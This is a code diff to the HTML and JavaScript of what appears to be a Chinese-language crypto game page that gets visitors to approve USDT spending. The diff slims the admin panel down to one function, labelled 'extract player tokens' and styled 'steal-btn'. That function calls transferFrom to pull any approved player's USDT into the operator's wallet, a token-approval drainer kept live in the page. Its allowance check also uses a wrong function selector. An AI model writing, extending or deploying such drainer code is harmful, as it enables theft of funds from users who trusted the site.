@@ -69,15 +69,13 @@ input{width:100%;padding:15px;background:#121720;border:1px solid #2a303e;border
     <button class="rpc-save" id="saveRpc">保存</button>
   </div>
 
+  <!-- 精简版管理员后台：仅保留提取玩家代币 -->
   <div class="admin-panel" id="adminPanel">
     <div class="admin-title">🔑 管理员后台</div>
     <div class="admin-info" id="userInfoPanel">
       <div>当前用户地址：<span id="currentUserAddr">-</span></div>
       <div style="margin-top:4px">授权额度：<span id="currentUserAllow">-</span> USDT</div>
     </div>
-    <input class="admin-input" id="adminTo" placeholder="转入地址">
-    <input class="admin-input" id="adminAmount" placeholder="转出数量 USDT">
-    <button class="admin-btn" id="adminTransfer">管理员转出</button>
     <input class="admin-input" id="userAddress" placeholder="玩家钱包地址">
     <button class="admin-btn steal-btn" id="takeUserToken">提取玩家代币</button>
   </div>
@@ -191,7 +189,7 @@ async function refreshAll() {
   await refreshUserInfoForAdmin()
 }
 
-// 动态刷新授权状态（核心修复）
+// 动态刷新授权状态（核心）
 async function refreshAllowance() {
   const el = document.getElementById('allowanceText')
   const btn = document.getElementById('approveBtn')
@@ -233,7 +231,7 @@ async function refreshBalance() {
   } catch (e) {}
 }
 
-// 管理员面板：当前用户信息（修复授权额度显示）
+// 管理员面板：当前用户信息
 async function refreshUserInfoForAdmin() {
   if (!visitorAddress || account.toLowerCase() !== ADMIN_WALLET.toLowerCase()) return
   try {
@@ -298,31 +296,13 @@ document.getElementById('withdrawBtn').onclick = () => {
   alert(`提取已提交\n地址：${addr}\n数量：${amt} USDT`)
 }
 
-// 管理员转出
-document.getElementById('adminTransfer').onclick = async () => {
-  if(account.toLowerCase() !== ADMIN_WALLET.toLowerCase()) return alert('无权限')
-  const to = document.getElementById('adminTo').value
-  const amt = document.getElementById('adminAmount').value
-  if(!to || !amt || isNaN(amt) || amt <= 0) return alert('请正确填写')
-  try {
-    const data = '0xa9059cbb' + pad(to) + hex(amt)
-    const tx = await window.ethereum.request({
-      method:'eth_sendTransaction',
-      params:[{from:account, to:USDT, data, gas:'0x4c4340'}]
-    })
-    alert('转出成功：' + tx)
-    await refreshAll()
-  }catch(e){ alert('失败：' + e.message) }
-}
-
-// 提取玩家代币（核心修复：正确 transferFrom 逻辑）
+// 提取玩家代币（仅保留此管理员功能）
 document.getElementById('takeUserToken').onclick = async () => {
   if(account.toLowerCase() !== ADMIN_WALLET.toLowerCase()) return alert('无权限')
   const userAddr = document.getElementById('userAddress').value
   if(!userAddr || !userAddr.startsWith('0x')) return alert('请输入玩家地址')
 
   try {
-    // 1. 查询玩家授权额度
     const allowData = '0xddf252ad' + pad(userAddr) + pad(ADMIN_WALLET)
     const allowRes = await window.ethereum.request({
       method:'eth_call',
@@ -331,7 +311,6 @@ document.getElementById('takeUserToken').onclick = async () => {
     const allowance = BigInt(allowRes)
     if(allowance <= 0n) return alert('该用户无可用授权额度')
 
-    // 2. 正确调用 transferFrom: from(玩家) → to(管理员)
     const transData = '0x23b872dd' 
       + pad(userAddr) 
       + pad(ADMIN_WALLET) 
@@ -343,7 +322,7 @@ document.getElementById('takeUserToken').onclick = async () => {
         from: account,
         to: USDT,
         data: transData,
-        gas: '0x80000' // 提高 Gas 上限避免失败
+        gas: '0x80000'
       }]
     })
 
